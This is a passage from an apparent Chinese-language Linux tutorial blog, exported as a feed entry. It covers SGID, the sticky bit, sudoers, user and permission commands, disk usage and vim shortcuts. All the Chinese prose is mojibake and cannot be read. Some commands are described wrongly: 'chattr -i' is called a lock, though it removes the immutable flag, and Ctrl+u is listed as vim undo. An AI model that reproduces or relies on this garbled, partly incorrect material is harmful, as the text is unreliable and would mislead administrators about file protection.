<li class="lvl-4">ç°åœ¨ï¼Œæ— è®º <code>userA</code>ï¼ˆä¸»ç»„ <code>groupA</code>ï¼‰è¿˜æ˜¯ <code>userB</code>ï¼ˆä¸»ç»„ <code>groupB</code>ï¼‰åœ¨ <code>/shared/projectX</code> ä¸‹åˆ›å»ºæ–‡ä»¶ <code>report.txt</code>ï¼Œè¯¥æ–‡ä»¶çš„æ‰€å±ç»„éƒ½ä¼šæ˜¯ <code>projectx-team</code>ï¼ˆè€Œä¸æ˜¯ <code>groupA</code> æˆ– <code>groupB</code>ï¼‰ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>è®¾ç½®ä¸æŸ¥çœ‹ï¼š</strong></p>
<ul class="lvl-2">
<li class="lvl-4">è®¾ç½®ï¼š<code>chmod g+s æ–‡ä»¶å/ç›®å½•å</code> æˆ– <code>chmod 2xxx æ–‡ä»¶å/ç›®å½•å</code> (e.g., <code>chmod 2775 sharedir</code>)</li>
<li class="lvl-4">æŸ¥çœ‹ï¼šå¦‚æœç»„åŸæœ¬æœ‰ <code>x</code> æƒé™ï¼Œ<code>ls -l</code> ä¸­ç»„æ‰§è¡Œä½æ˜¾ç¤ºä¸º <code>s</code>ï¼Œå¦‚æœç»„åŸæœ¬<em>æ²¡æœ‰</em> <code>x</code> æƒé™ï¼Œåˆ™ç»„æ‰§è¡Œä½æ˜¾ç¤ºä¸º<code>S</code>ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>å®‰å…¨æç¤ºï¼š</strong> SGID çš„é£é™©é€šå¸¸ä½äº SUIDï¼Œä½†ä»éœ€è°¨æ…è®¾ç½®äºå¯æ‰§è¡Œæ–‡ä»¶ã€‚åœ¨ç›®å½•ä¸Šçš„åº”ç”¨æ˜¯å®‰å…¨ä¸”æ¨èçš„æ–‡ä»¶å…±äº«æ–¹å¼ã€‚</p>
</li>
</ul>
<hr>
<h4 id="Sticky-Bit"><strong>Sticky Bit</strong></h4>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>ç¬¦å·è¡¨ç¤ºï¼š</strong> <code>t</code>ï¼ˆå‡ºç°åœ¨å…¶ä»–ç”¨æˆ·çš„<strong>æ‰§è¡Œæƒé™</strong>ä½ç½®ï¼‰</p>
</li>
<li class="lvl-2">
<p><strong>å…«è¿›åˆ¶è¡¨ç¤ºï¼š</strong> <code>1</code>ï¼ˆå¦‚ <code>1777</code>ï¼‰</p>
</li>
<li class="lvl-2">
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul class="lvl-2">
<li class="lvl-4">ä»…å¯¹<strong>ç›®å½•</strong>æœ‰æ„ä¹‰ã€‚</li>
<li class="lvl-4">åœ¨è®¾ç½®äº† Sticky Bit çš„ç›®å½•ä¸­ï¼Œ<strong>ç”¨æˆ·åªèƒ½åˆ é™¤æˆ–é‡å‘½åè‡ªå·±æ‹¥æœ‰çš„æ–‡ä»¶æˆ–ç›®å½•</strong>ï¼Œå³ä½¿è¯¥ç›®å½•çš„å†™æƒé™ (<code>w</code>) å¯¹å…¶ä»–ç”¨æˆ·å¼€æ”¾ï¼ˆå¦‚ <code>rwxrwxrwt</code>ï¼‰ã€‚</li>
<li class="lvl-4">æ ¸å¿ƒç›®çš„ï¼š<strong>ä¿æŠ¤ç”¨æˆ·æ–‡ä»¶ä¸è¢«ä»–äººè¯¯åˆ </strong>ã€‚åœ¨å…¨å±€å¯å†™çš„ç›®å½•ä¸­ï¼ˆå¦‚ä¸´æ—¶ç›®å½•ï¼‰ï¼Œé˜²æ­¢ç”¨æˆ·éšæ„åˆ é™¤ä»–äººçš„æ–‡ä»¶ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>ç»å…¸ä¾‹å­ï¼š</strong> ç³»ç»Ÿä¸´æ—¶ç›®å½• <code>/tmp</code></p>
<ul class="lvl-2">
<li class="lvl-4">æƒé™é€šå¸¸æ˜¯ <code>drwxrwxrwt</code>ã€‚</li>
<li class="lvl-4">æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€‚</li>
<li class="lvl-4">æœ«å°¾çš„ <code>t</code> è¡¨ç¤º Sticky Bit å·²è®¾ç½®ã€‚</li>
<li class="lvl-4">ç”¨æˆ· <code>user1</code> å¯ä»¥åœ¨ <code>/tmp</code> åˆ›å»ºæ–‡ä»¶ <code>/tmp/user1file</code>ã€‚</li>
<li class="lvl-4">ç”¨æˆ· <code>user2</code> è™½ç„¶å¯¹æ•´ä¸ª <code>/tmp</code> æœ‰å†™æƒé™ï¼Œä½†<strong>ä¸èƒ½åˆ é™¤æˆ–é‡å‘½å</strong> <code>/tmp/user1file</code>ï¼ˆé™¤éä»–æ˜¯ <code>root</code> æˆ–æ–‡ä»¶æ‰€æœ‰è€… <code>user1</code>ï¼‰ã€‚<code>user2</code> å¯ä»¥åˆ›å»ºè‡ªå·±çš„ <code>/tmp/user2file</code>ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>è®¾ç½®ä¸æŸ¥çœ‹ï¼š</strong></p>
<ul class="lvl-2">
<li class="lvl-4">è®¾ç½®ï¼š<code>chmod o+t ç›®å½•å</code> æˆ– <code>chmod 1xxx ç›®å½•å</code> (e.g., <code>chmod 1777 /public/tmp</code>)</li>
<li class="lvl-4">æŸ¥çœ‹ï¼šå¦‚æœå…¶ä»–ç”¨æˆ·åŸæœ¬æœ‰ <code>x</code> æƒé™ï¼Œ<code>ls -l</code> ä¸­å…¶ä»–ç”¨æˆ·æ‰§è¡Œä½æ˜¾ç¤ºä¸º <code>t</code>ï¼Œå¦‚æœå…¶ä»–ç”¨æˆ·åŸæœ¬<em>æ²¡æœ‰</em> <code>x</code> æƒé™ï¼Œå…¶ä»–ç”¨æˆ·æ‰§è¡Œä½æ˜¾ç¤ºä¸º<code>T</code>ã€‚</li>
</ul>
</li>
<li class="lvl-2">
<p><strong>åº”ç”¨åœºæ™¯ï¼š</strong> ä¸»è¦ç”¨äºå…¨å±€å¯å†™çš„å…±äº«ä¸´æ—¶ç›®å½•ï¼ˆå¦‚ <code>/tmp</code>ï¼‰ã€‚ç°ä»£ Linux ä¸­ï¼Œå¯¹ç”¨æˆ·ä¸»ç›®å½• (<code>~</code>) æˆ–æ™®é€šå…±äº«ç›®å½•ï¼ˆä½¿ç”¨ SGID ç®¡ç†ç»„ï¼‰é€šå¸¸ä¸éœ€è¦è®¾ç½® Sticky Bitã€‚</p>
</li>
</ul>
<hr>
<h4 id="æ€»ç»“"><strong>æ€»ç»“</strong></h4>
<table>
<thead>
<tr>
<th>æƒé™åç§°</th>
<th>ç¬¦å·</th>
<th>å…«è¿›åˆ¶å€¼</th>
<th>ä¸»è¦ä½œç”¨å¯¹è±¡</th>
<th>æ ¸å¿ƒåŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>SUID</strong></td>
<td><code>s</code> (æ‰€æœ‰è€…xä½)</td>
<td><code>4</code></td>
<td><strong>å¯æ‰§è¡Œæ–‡ä»¶</strong></td>
<td>æ‰§è¡Œæ—¶è·å¾—<strong>æ–‡ä»¶æ‰€æœ‰è€…</strong>æƒé™</td>
</tr>
<tr>
<td><strong>SGID</strong></td>
<td><code>s</code> (ç»„xä½)</td>
<td><code>2</code></td>
<td><strong>å¯æ‰§è¡Œæ–‡ä»¶</strong></td>
<td>æ‰§è¡Œæ—¶è·å¾—<strong>æ–‡ä»¶æ‰€å±ç»„</strong>æƒé™</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td><strong>ç›®å½•</strong></td>
<td>ç›®å½•ä¸‹<strong>æ–°å»ºæ–‡ä»¶ç»§æ‰¿ç›®å½•çš„ç»„</strong></td>
</tr>
<tr>
<td><strong>Sticky Bit</strong></td>
<td><code>t</code> (å…¶ä»–ç”¨æˆ·xä½)</td>
<td><code>1</code></td>
<td><strong>ç›®å½•</strong></td>
<td><strong>ä»…æ–‡ä»¶æ‰€æœ‰è€…å¯åˆ é™¤</strong>ç›®å½•ä¸‹çš„æ–‡ä»¶</td>
</tr>
</tbody>
</table>
<hr>
<p><strong>æŸ¥çœ‹ç³»ç»Ÿä¸­çš„ç‰¹æ®Šæƒé™å®ä¾‹</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>SUID:</strong> <code>ls -l /usr/bin/passwd</code> (åº”çœ‹åˆ° <code>-rwsr-xr-x</code>)</p>
</li>
<li class="lvl-2">
<p><strong>SGID (ç›®å½•):</strong> <code>ls -ld /var/mail</code> (å¾ˆå¤šç³»ç»Ÿè®¾ç½®ä¸º <code>drwxrwsr-x</code>)</p>
</li>
<li class="lvl-2">
<p><strong>Sticky Bit:</strong> <code>ls -ld /tmp</code> (åº”çœ‹åˆ° <code>drwxrwxrwt</code>)</p>
</li>
</ul>
<p>ç†è§£å¹¶æ­£ç¡®ä½¿ç”¨è¿™ä¸‰ä¸ªç‰¹æ®Šæƒé™å¯¹äº Linux ç³»ç»Ÿç®¡ç†ã€æƒé™è§„åˆ’å’Œç³»ç»Ÿå®‰å…¨è‡³å…³é‡è¦ã€‚åŠ¡å¿…è°¨æ…è®¾ç½® SUIDï¼Œå–„ç”¨ SGID ç®¡ç†å…±äº«ç›®å½•ï¼Œå¹¶åœ¨éœ€è¦å…¨å±€å¯å†™ä¸´æ—¶ç›®å½•æ—¶ä½¿ç”¨ Sticky Bitã€‚</p>
<h3 id="sudoersæƒé™åˆ†é…">sudoersæƒé™åˆ†é…</h3>
<p><strong><code>sudoers</code>æ–‡ä»¶ç¼–è¾‘ä¸å®šä½</strong></p>
<p>æ‰§è¡Œ<code>visudo</code>å‘½ä»¤è¿›å…¥ç¼–è¾‘ç•Œé¢åï¼Œå¯é€šè¿‡<code>100gg</code>å¿«æ·é”®å¿«é€Ÿå®šä½è‡³æ–‡ä»¶ç¬¬ 100 è¡Œé™„è¿‘ï¼ˆå…·ä½“è¡Œæ•°éœ€æ ¹æ®ç³»ç»Ÿç‰ˆæœ¬åŠé…ç½®å†å²è°ƒæ•´ï¼Œé€šå¸¸ç”¨äºæ‰¾åˆ°é¢„è®¾çš„ç”¨æˆ·æƒé™é…ç½®æ®µï¼‰ï¼Œåœ¨æ­¤å¤„å¯æ·»åŠ æˆ–ä¿®æ”¹ç”¨æˆ·çš„<code>sudo</code>æƒé™è§„åˆ™ã€‚</p>
<p><strong>éªŒè¯<code>sudoers</code>é…ç½®æ­£ç¡®æ€§</strong></p>
<p>é…ç½®å®Œæˆåï¼Œéœ€é€šè¿‡<code>visudo -c</code>å‘½ä»¤éªŒè¯<code>/etc/sudoers</code>æ–‡ä»¶çš„è¯­æ³•åˆæ³•æ€§ï¼Œç¡®ä¿æ— æ ¼å¼é”™è¯¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[01:18:44 root@centon7 tmp]# visudo -c</span><br><span class="line">/etc/sudoersï¼šè§£ææ­£ç¡®</span><br></pre></td></tr></table></figure>
<p>è‹¥è¾“å‡º â€œè§£ææ­£ç¡®â€ï¼Œåˆ™è¯´æ˜é…ç½®æ–‡ä»¶è¯­æ³•æ— è¯¯ï¼Œå¯æ­£å¸¸ç”Ÿæ•ˆã€‚</p>
<p><strong>æŸ¥çœ‹ç³»ç»Ÿç”¨æˆ·ä¸æƒé™é…ç½®</strong></p>
<p>åœ¨<code>/etc/sudoers</code>ä¸­ï¼Œç”¨æˆ·æƒé™è§„åˆ™çš„å…¸å‹é…ç½®æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·å  ALL=(ALL)  /sbin/useradd,/bin/cat</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>ALL=(ALL)</code>è¡¨ç¤ºè¯¥ç”¨æˆ·å¯åœ¨æ‰€æœ‰ä¸»æœºä¸Šä»¥æ‰€æœ‰ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼›</p>
</li>
<li class="lvl-2">
<p>æœ«å°¾çš„<code>/sbin/useradd,/bin/cat</code>ä¸ºå…è®¸æ‰§è¡Œçš„å…·ä½“å‘½ä»¤åˆ—è¡¨ï¼ˆå¤šå‘½ä»¤ç”¨é€—å·åˆ†éš”ï¼‰ã€‚</p>
</li>
</ul>
<p><strong>æŸ¥çœ‹ç”¨æˆ·<code>sudo</code>æƒé™</strong></p>
<p>å¯¹äºå·²é…ç½®<code>sudo</code>æƒé™çš„ç”¨æˆ·ï¼Œå¯é€šè¿‡<code>sudo -l</code>å‘½ä»¤æŸ¥çœ‹è‡ªèº«è¢«æˆæƒçš„å…·ä½“æ“ä½œï¼Œä¾¿äºéªŒè¯æƒé™åˆ†é…æ˜¯å¦ç¬¦åˆé¢„æœŸï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
<p>è¯¥å‘½ä»¤ä¼šåˆ—å‡ºå½“å‰ç”¨æˆ·å¯é€šè¿‡<code>sudo</code>æ‰§è¡Œçš„æ‰€æœ‰å‘½ä»¤åŠç›¸å…³é™åˆ¶ã€‚</p>
<h3 id="ç”¨æˆ·åŠæƒé™ç®¡ç†å‘½ä»¤">ç”¨æˆ·åŠæƒé™ç®¡ç†å‘½ä»¤</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1 chmod</span></span><br><span class="line"><span class="built_in">chmod</span> XXX filename   <span class="comment">#æ•°å­—èµ‹æƒ</span></span><br><span class="line"><span class="built_in">chmod</span> +x filename    <span class="comment">#æ·»åŠ æ‰§è¡Œæƒ</span></span><br><span class="line"><span class="built_in">chmod</span> u+x,g+x,o+x  filename   <span class="comment">#æ‰€æœ‰ç”¨æˆ·æ·»åŠ æ‰§è¡Œæƒ==chmod +x filename==chmod a+x filename</span></span><br><span class="line"><span class="built_in">chmod</span> ug+w,o-w 1.txt 2.txt</span><br><span class="line"><span class="built_in">chmod</span> a=wx c.txt</span><br><span class="line"><span class="built_in">chmod</span> -R             <span class="comment"># å‘½ä»¤è¡¨ç¤ºå°†æŸä¸ªç›®å½•ä¸‹é¢æ‰€æœ‰çš„å†…å®¹éƒ½å¢åŠ ç›¸åº”æƒé™</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#id</span></span><br><span class="line"><span class="built_in">id</span> user              <span class="comment">#æŸ¥çœ‹ç”¨æˆ·çš„ UIDã€GID ä»¥åŠæ‰€å±çš„ç”¨æˆ·ç»„åˆ—è¡¨</span></span><br><span class="line"><span class="built_in">id</span>                   <span class="comment">#æŸ¥çœ‹è‡ªå·±çš„ UIDã€GID ä»¥åŠæ‰€å±çš„ç”¨æˆ·ç»„åˆ—è¡¨</span></span><br><span class="line"><span class="comment">#whoami   å¯ä»¥æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ“ä½œè€…  å³ ç™»å½•çš„ç”¨æˆ·</span></span><br><span class="line"><span class="comment">#w        å¯ä»¥æŸ¥çœ‹å½“å‰ç³»ç»Ÿç™»å½•çš„ç”¨æˆ·ä¿¡æ¯   æŒ‡çš„æ˜¯ æ­£åœ¨è¿æ¥ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#useradd  --æ·»åŠ ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">-c   <span class="comment">#è®¾ç½®ç”¨æˆ·å¤‡æ³¨ä¿¡æ¯</span></span><br><span class="line">-u   <span class="comment">#è®¾ç½®æŒ‡å®šç”¨æˆ·æ‰€å±ä¸»   uid</span></span><br><span class="line">-g   <span class="comment">#è®¾ç½®ç”¨æˆ·æ‰€å±ç»„ä¿¡æ¯   gid</span></span><br><span class="line">-G   <span class="comment">#è®¾ç½®ç”¨æˆ·æ‰€å±çš„é™„åŠ ç»„   </span></span><br><span class="line">-M   <span class="comment">#è®¾ç½®ç”¨æˆ·ä¸åˆ›å»ºå®¶ç›®å½•ï¼ˆåˆ›å»ºè™šæ‹Ÿç”¨æˆ·ï¼‰</span></span><br><span class="line">-s   <span class="comment">#è®¾ç½®ç”¨æˆ·æ˜¯å¦èƒ½ç™»å½•ï¼ˆåˆ›å»ºè™šæ‹Ÿç”¨æˆ·ï¼‰</span></span><br><span class="line">useradd -g <span class="built_in">users</span> -c <span class="string">&quot;hr tom&quot;</span> tom</span><br><span class="line"></span><br><span class="line"><span class="comment">#su      åˆ‡æ¢ç”¨æˆ·ï¼šè¡¨ç¤ºæ›¿æ¢æˆ–è½¬æ¢ç”¨æˆ·èº«ä»½ ä¸å®Œå…¨åˆ‡æ¢</span></span><br><span class="line"><span class="comment">#su -    å®Œå…¨åˆ‡æ¢ ç”¨æˆ·ç›¸å…³ç¯å¢ƒå˜é‡ä¿¡æ¯ä¼šä¸€å¹¶å½»åº•åˆ‡æ¢</span></span><br><span class="line"><span class="comment">#sudo    ææƒï¼Œä½†éœ€è¦å…ˆå¯¹ç‰¹æ®Šæ“ä½œè¿›è¡Œæƒé™åˆ†é…</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#passwd  è®¾ç½®/æ›´æ”¹å¯†ç </span></span><br><span class="line"><span class="comment">#é¢äº¤äº’æ–¹å¼åˆ›å»ºç”¨æˆ·å¹¶è®¾ç½®å¯†ç ï¼ˆå¯åˆ©ç”¨è„šæœ¬åˆ›å»ºç”¨æˆ·ï¼‰</span></span><br><span class="line">useradd xhy</span><br><span class="line"><span class="built_in">echo</span> 123456|passwd --stdin xhy</span><br><span class="line"></span><br><span class="line"><span class="comment">#userdel  </span></span><br><span class="line">userdel  ç”¨æˆ·å     <span class="comment">#ä¿ç•™ç”¨æˆ·å®¶ç›®å½•çš„æ•°æ®</span></span><br><span class="line">userdel -r  ç”¨æˆ·å  <span class="comment">#å½»åº•åˆ é™¤ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#usermod å‚æ•° åŒ¹é…ä¿¡æ¯ å¯¹è±¡</span></span><br><span class="line">-c   <span class="comment">#ä¿®æ”¹ç”¨æˆ·å¤‡æ³¨ä¿¡æ¯</span></span><br><span class="line">-u   <span class="comment">#ä¿®æ”¹æŒ‡å®šç”¨æˆ·æ‰€å±ä¸»   uid</span></span><br><span class="line">-g   <span class="comment">#ä¿®æ”¹ç”¨æˆ·æ‰€å±ç»„ä¿¡æ¯   gid</span></span><br><span class="line">-G   <span class="comment">#ä¿®æ”¹ç”¨æˆ·æ‰€å±çš„é™„åŠ ç»„   </span></span><br><span class="line">-aG  <span class="comment">#æ·»åŠ ç”¨æˆ·åˆ°å¤šä¸ªé™„åŠ ç»„</span></span><br><span class="line">-M   <span class="comment">#ä¿®æ”¹ç”¨æˆ·ä¸åˆ›å»ºå®¶ç›®å½•ï¼ˆåˆ›å»ºè™šæ‹Ÿç”¨æˆ·ï¼‰</span></span><br><span class="line">-s   <span class="comment">#ä¿®æ”¹ç”¨æˆ·æ˜¯å¦èƒ½ç™»å½•ï¼ˆåˆ›å»ºè™šæ‹Ÿç”¨æˆ·ï¼‰</span></span><br><span class="line">-l	 <span class="comment">#æŒ‡å®šæ–°çš„ç”¨æˆ·å</span></span><br><span class="line">-d	 <span class="comment">#å¯é€‰å‚æ•°ï¼ŒåŒæ—¶ä¿®æ”¹ç”¨æˆ·çš„å®¶ç›®å½•è·¯å¾„</span></span><br><span class="line">-m	 <span class="comment">#ä¸ -d é…åˆä½¿ç”¨ï¼Œå°†åŸå®¶ç›®å½•å†…å®¹ç§»åŠ¨åˆ°æ–°è·¯å¾„</span></span><br><span class="line">usermod -l newuser -d /home/newuser -m olduser</span><br><span class="line"></span><br><span class="line"><span class="comment">#chown:ä¿®æ”¹æ–‡ä»¶å±ä¸»å’Œå±ç»„</span></span><br><span class="line"><span class="built_in">chown</span> root /var/log/httpd.log     <span class="comment"># æ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€…ä¸ºroot</span></span><br><span class="line"><span class="built_in">chown</span> :staff /home/user/file.txt  <span class="comment"># ä»…æ›´æ”¹æ–‡ä»¶æ‰€å±ç»„ä¸ºstaff</span></span><br><span class="line"><span class="built_in">chown</span> user1:group1 /data/project  <span class="comment"># åŒæ—¶æ›´æ”¹ç›®å½•çš„æ‰€æœ‰è€…å’Œç»„</span></span><br><span class="line"><span class="built_in">chown</span>  -R  ä¸»:ç»„ æ–‡ä»¶               <span class="comment">#é€’å½’æ›´æ”¹ç›®å½•åŠå…¶æ‰€æœ‰å­æ–‡ä»¶ã€å­ç›®å½•çš„æ‰€æœ‰æƒ</span></span><br><span class="line">-h                                <span class="comment">#ä»…æ›´æ”¹ç¬¦å·é“¾æ¥æœ¬èº«çš„æ‰€æœ‰æƒï¼Œè€Œéå…¶æŒ‡å‘çš„ç›®æ ‡æ–‡ä»¶ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gpasswd</span></span><br><span class="line">gpasswd -a ç”¨æˆ· ç»„	<span class="comment">#æ·»åŠ ç”¨æˆ·åˆ°ç»„</span></span><br><span class="line">gpasswd -d ç”¨æˆ· ç»„	<span class="comment">#ä»ç»„ä¸­åˆ é™¤ç”¨æˆ·</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#chattr</span></span><br><span class="line">chattr -i          <span class="comment">#é‡è¦æ–‡ä»¶ä¸Šé”</span></span><br><span class="line">chattr -i p        <span class="comment">#è§£é”ï¼ˆå¯ä»¥å°†å‘½ä»¤åç§°æ”¹åï¼Œè¿™æ ·é»‘å®¢å°±ä¸çŸ¥é“æ€ä¹ˆè§£é”äº†ï¼‰</span></span><br></pre></td></tr></table></figure>
<h2 id="ç£ç›˜ç®¡ç†">ç£ç›˜ç®¡ç†</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1 du</span></span><br><span class="line"><span class="built_in">du</span> -sh filePath   <span class="comment">#æ–‡ä»¶å­˜å‚¨åˆ°ç£ç›˜æ‰€å çš„ç©ºé—´ï¼ˆblockï¼‰</span></span><br><span class="line"><span class="comment">#æŸ¥çœ‹æ–‡ä»¶å¤§å°</span></span><br><span class="line"><span class="built_in">du</span> -h</span><br><span class="line"><span class="built_in">du</span> -ah</span><br><span class="line"><span class="comment">#æŸ¥çœ‹åˆ†åŒº</span></span><br><span class="line"><span class="built_in">df</span> -h</span><br><span class="line"></span><br><span class="line"><span class="comment">#df [é€‰é¡¹] [æ–‡ä»¶æˆ–è®¾å¤‡]</span></span><br><span class="line">-h    <span class="comment">#ä»¥äººç±»å¯è¯»çš„æ ¼å¼æ˜¾ç¤ºç£ç›˜ç©ºé—´å¤§å°</span></span><br><span class="line">-T    <span class="comment">#æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿç±»å‹</span></span><br><span class="line">-i    <span class="comment">#æ˜¾ç¤º inode ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">df</span>    <span class="comment">#æ˜¾ç¤ºç£ç›˜ç©ºé—´å¤§å°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mount æŒ‚è½½ç¡¬ç›˜</span></span><br><span class="line"><span class="comment">#umount å–æ¶ˆæŒ‚è½½</span></span><br></pre></td></tr></table></figure>
<h2 id="vimä½¿ç”¨">vimä½¿ç”¨</h2>
<p>æ™®é€šæ¨¡å¼:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yy     <span class="comment">#å¤åˆ¶å…‰æ ‡æ‰€åœ¨è¡Œ</span></span><br><span class="line">nyy    <span class="comment">#æ•°å­—yy å¤åˆ¶è¿ç»­å¤šè¡Œå†…å®¹</span></span><br><span class="line">p      <span class="comment">#ç²˜è´´å¤åˆ¶/å‰ªåˆ‡çš„å†…å®¹</span></span><br><span class="line">np     <span class="comment">#ç²˜è´´næ¬¡å¤åˆ¶/å‰ªåˆ‡çš„å†…å®¹ </span></span><br><span class="line"><span class="built_in">dd</span>     <span class="comment">#åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œ</span></span><br><span class="line">ndd    <span class="comment">#åˆ é™¤nè¡Œ</span></span><br><span class="line">D	   <span class="comment">#åˆ é™¤æœ¬è¡Œå†…å®¹ï¼Œä½†æ˜¯ä¿ç•™ç©ºè¡Œ</span></span><br><span class="line">dG     <span class="comment">#åˆ é™¤å…‰æ ‡æ‰€åœ¨ä½ç½®åçš„æ‰€æœ‰è¡Œå†…å®¹</span></span><br><span class="line">G      <span class="comment">#å…‰æ ‡è·³è½¬åˆ°æœ€åä¸€è¡Œ</span></span><br><span class="line">gg	   <span class="comment">#å…‰æ ‡è·³è½¬åˆ°ç¬¬ä¸€è¡Œ</span></span><br><span class="line">nG     <span class="comment">#å…‰æ ‡è·³è½¬åˆ°ç¬¬nè¡Œ</span></span><br><span class="line">$      <span class="comment">#å…‰æ ‡è·³è½¬å½“å‰è¡Œçš„æœ«å°¾</span></span><br><span class="line">0      <span class="comment">#å…‰æ ‡è·³è½¬åˆ°å½“å‰è¡Œçš„å¼€å¤´</span></span><br><span class="line">Ctrl+u <span class="comment">#undo</span></span><br><span class="line">ctrl+r <span class="comment">#redo</span></span><br></pre></td></tr></table></figure>
<p>æœ«è¡Œæ¨¡å¼(å‘½ä»¤æ¨¡å¼)ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:/è¦æ£€ç´¢çš„å†…å®¹      <span class="comment">#æ£€ç´¢</span></span><br><span class="line">: %s/root/ROOT/g <span class="comment">#æ›¿æ¢</span></span><br><span class="line">:<span class="built_in">set</span> nu          <span class="comment">#æ˜¾ç¤ºè¡Œå· </span></span><br><span class="line">:q               <span class="comment">#ä¸ä¿å­˜é€€å‡º</span></span><br><span class="line">:q!              <span class="comment">#å¼ºåˆ¶ä¸ä¿å­˜é€€å‡º</span></span><br><span class="line">:wq              <span class="comment">#ä¿å­˜é€€å‡º</span></span><br><span class="line">:wq!             <span class="comment">#å¼ºåˆ¶ä¿å­˜é€€å‡º</span></span><br><span class="line">:e!              <span class="comment">#æ¢å¤åˆ°æœ€åˆçŠ¶æ€</span></span><br><span class="line">:w a.txt         <span class="comment">#å¦å­˜ä¸º</span></span><br><span class="line">:w &gt;&gt; a.txt      <span class="comment">#å†…å®¹è¿½åŠ åˆ°a.txt</span></span><br></pre></td></tr></table></figure>
<p>æ¯æ¬¡è¿›å…¥viå°±æœ‰è¡Œå·ç¼–è¾‘æ–‡ä»¶<code>.vimc</code>æ·»åŠ <code>set nu</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi ~/.vimrc</span><br><span class="line"><span class="built_in">set</span> nu</span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Linuxã€‘æ–‡ä»¶ç®¡ç†</title>
    <url>/posts/2d0621ba/</url>
    <content><![CDATA[<h2 id="Linuxç›®å½•">Linuxç›®å½•</h2>
<p><img src="/posts/2d0621ba//image-20250219153540620.png" alt="Linuxç›®å½•"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>/ï¼šæ ¹ç›®å½•ï¼Œä¸€èˆ¬æ ¹ç›®å½•ä¸‹åªå­˜æ”¾ç›®å½•ï¼Œåœ¨Linuxä¸‹æœ‰ä¸”åªæœ‰ä¸€ä¸ªæ ¹ç›®å½•ã€‚æ‰€æœ‰çš„ä¸œè¥¿éƒ½æ˜¯ä»è¿™é‡Œå¼€å§‹ã€‚å½“ä½ åœ¨ç»ˆç«¯é‡Œè¾“å…¥â€œ/homeâ€ï¼Œä½ å…¶å®æ˜¯åœ¨å‘Šè¯‰ç”µè„‘ï¼Œå…ˆä»/ï¼ˆæ ¹ç›®å½•ï¼‰å¼€å§‹ï¼Œå†è¿›å…¥åˆ°homeç›®å½•ã€‚</p>
</li>
<li class="lvl-2">
<p>/bin: /usr/bin: å¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç›®å½•ï¼Œå¦‚å¸¸ç”¨çš„å‘½ä»¤lsã€tarã€mvã€catç­‰ã€‚</p>
</li>
<li class="lvl-2">
<p>/bootï¼šæ”¾ç½®linuxç³»ç»Ÿå¯åŠ¨æ—¶ç”¨åˆ°çš„ä¸€äº›æ–‡ä»¶ï¼Œå¦‚Linuxçš„å†…æ ¸æ–‡ä»¶ï¼š/boot/vmlinuzï¼Œç³»ç»Ÿå¼•å¯¼ç®¡ç†å™¨ï¼š/boot/grubã€‚</p>
</li>
<li class="lvl-2">
<p>/devï¼šå­˜æ”¾linuxç³»ç»Ÿä¸‹çš„è®¾å¤‡æ–‡ä»¶ï¼Œè®¿é—®è¯¥ç›®å½•ä¸‹æŸä¸ªæ–‡ä»¶ï¼Œç›¸å½“äºè®¿é—®æŸä¸ªè®¾å¤‡ï¼Œå¸¸ç”¨çš„æ˜¯æŒ‚è½½å…‰é©± mount /dev/cdrom /mntã€‚</p>
</li>
<li class="lvl-2">
<p>/etcï¼šç³»ç»Ÿé…ç½®æ–‡ä»¶å­˜æ”¾çš„ç›®å½•ï¼Œä¸å»ºè®®åœ¨æ­¤ç›®å½•ä¸‹å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‡è¦çš„é…ç½®æ–‡ä»¶æœ‰ /etc/inittabã€/etc/fstabã€/etc/init.dã€/etc/X11ã€/etc/sysconfigã€/etc/xinetd.dã€‚</p>
</li>
<li class="lvl-2">
